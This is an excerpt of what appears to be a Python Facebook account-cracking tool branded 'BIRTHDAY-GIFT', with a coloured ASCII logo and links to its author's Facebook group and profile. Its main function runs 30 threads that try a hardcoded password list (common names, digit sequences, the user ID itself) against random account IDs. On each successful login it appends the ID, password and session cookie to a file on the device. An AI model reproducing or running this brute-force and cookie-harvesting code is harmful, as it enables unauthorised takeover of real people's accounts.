...
def hasan_ua1():
	...
	return ua
#-----------------------------------------------------#
sys.stdout.write('\x1b]2; ꧁☠[🔥]=[BIRTHDAY-GIFT]=[🔥]☠꧂\x07')
#-----------------------------------------------------#
#-----------Logo------------#
os.system('clear')
priti = """ \033[1;92m
  ...
  ██   ██ ██   ██      ██ ██   ██ ██  ██ ██ 
  ██   ██ ██   ██ ███████ ██   ██ ██   ████ 
           \033[1;33m ۝࿐ \033[38;5;85mBIRTHDAY GIFT \033[93m࿐۝
 \033[1;93m۝࿐\x1b[97m════════════════════════════════════════\033[1;93m࿐۝\x1b[97m
      \x1b[93m  MY BIRTHDAY 1 JANUARY 2024
      \x1b[92m OWNER \x1b[93m : \x1b[92m ASRAFUL ISLAM HASAN
 \033[1;93m۝࿐\x1b[97m════════════════════════════════════════\033[1;93m࿐۝\x1b[97m
"""
def lvl():
...
#-----------Admin Info------------#
def admin_group():
	os.system('xdg-open https://facebook.com/groups/551365756758487/');clear();jannat()
def admin_id():
	os.system('xdg-open https://www.facebook.com/copy.link.erorr404');clear();jannat()
def admin_page():
	os.system('xdg-open https://www.facebook.com/profile.php?id=100090740779812&mibextid=rS40aB7S9Ucbxw6v');clear();jannat()
#------Locked Id Remove------#			
def lock(uid):
	...
	with tred(max_workers=30) as hasan:
		...
		for psx in user:
			...
			if 'pk' in ck:
				...
				passlist = ['00998877','sumaiya','jannat','sadiya','nazmul','saiful','soniya','203040','304050','bangladesh','506070','708090','607080','@@@###','908070','jesmin','১২৩৪৫৬','১১২২৩৩','১২৩৪৫৬৭৮','77889900',ids,psx]
			elif 'ind' in ck:
	...
	try:
		...
		for pas in passlist:
			...
			if 'session_key' in po:
				...
				open('/sdcard/HASAN-RANDOM-OK-COOKIES.txt','a').write(uid+'|'+pas+'|'+coki+'\n')
				oks.append(uid)
				break
